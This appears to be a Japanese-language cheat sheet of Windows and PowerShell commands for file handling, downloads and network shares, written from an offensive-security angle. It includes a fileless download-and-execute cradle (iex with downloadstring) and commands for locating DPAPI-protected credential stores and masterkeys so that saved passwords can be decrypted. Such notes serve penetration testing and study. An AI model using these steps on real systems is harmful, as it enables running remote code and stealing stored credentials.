# File
ファイル操作関連のコマンド。
```bash
new-item <File>
"" > <File>
remove-item <File>
rmdir <Directory>
-force # 強制削除
```
# File download
```
wget <URL> -o <File path>
iwr -uri <URL> -o <File path>
```
# iex
ファイルをダウンロードせずにメモリ上で実行する。
```
iex (new-object net.webclient).downloadstring('<URL>')
```
# net
```powershell
net user # 全ユーザー表示
net use # マウントしているドライブを表示
net use \\<Host>\<Share> /user:<User> <Password> # 外部フォルダ接続
net use X: \\<Host>\<Share> # Xドライブに外部フォルダをマウント
net use X: \\<Host>\<Share> /user:<User> <Password> # Xドライブに外部フォルダをマウント、認証あり
net use X: /delete # マウント削除
```
# DPAPI
Data Protection APIの略で、パスワード、クッキー、証明書などを暗号化して保存するためのAPI。
`/savecred`などの資格情報もDPAPIによって暗号化されてディスクに保存されている。
DPAPIで暗号化されたファイルを復号するにはMasterkeyが必要で、`dir /S /AS`を使って探すことができる。
`runas /savecred`、資格情報を記憶するにチェック、Outlookなどがパスワードを保存しているといった場合に下記のコマンドで探すことができる。
```
dir /S /AS C:\Users\<User>\AppData\Local\Microsoft\Vault # ブラウザの自動補完、アプリケーションが保存したパスワード
dir /S /AS C:\Users\<User>\AppData\Local\Microsoft\Credentials # ローカル端末関連のパスワード
dir /S /AS C:\Users\<User>\AppData\Local\Microsoft\Protect # 端末固有のデータのmasterkey
dir /S /AS C:\Users\<User>\AppData\Roaming\Microsoft\Vault # あまり使われない
dir /S /AS C:\Users\<User>\AppData\Roaming\Microsoft\Credentials # ドメインネットワーク内の共有フォルダのアクセス権や/savecredなどのデータ
dir /S /AS C:\Users\<User>\AppData\Roaming\Microsoft\Protect # ユーザーごとのデータのmasterkey
```
# attrib
```
attrib -H -S <Hidden files> # 隠しとシステム属性を解除
```
